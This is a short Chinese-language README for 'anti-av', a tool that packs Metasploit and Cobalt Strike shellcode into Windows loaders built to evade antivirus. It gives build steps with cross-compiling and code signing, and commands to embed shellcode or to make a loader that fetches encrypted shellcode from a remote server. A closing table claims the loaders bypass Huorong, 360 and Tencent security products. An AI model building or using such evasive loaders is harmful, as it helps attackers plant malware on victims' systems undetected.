# ANTI-AV



## 描述
*shellcode*免杀加载，*payload*支持**msf** (-f raw)和**cs**(payload raw)



## 安装

### Requirement

```bash
1、建议使用Mac或 linux环境
2、安装交叉编译 mingw64
3、安装签名 osslsigncode
```



### anti-av

```bash
git clone https://github.com/b1gcat/anti-av.git
go build
```



## 使用方案

### 1、binary自解压shellcode
```bash
./anti-av -l binary -sc ~/Desktop/payload.bin 
```



### 2、binary远程加载shellcode

> STEP1: 生成加密payload (dist目录下生成payload.e)

```bash
./anti-av  -e ~/Desktop/payload.bin 
```
> STEP2: 上传payload.e到服务器

```
略
```

> STEP3: 制作loader

```bash
./anti-av -sc http://x.x.x.x/payload.e 
```



## 测试

| 火绒 | 360安全卫士 | 腾讯管家 |
| ---- | ----------- | -------- |
| √    | √           | √        |

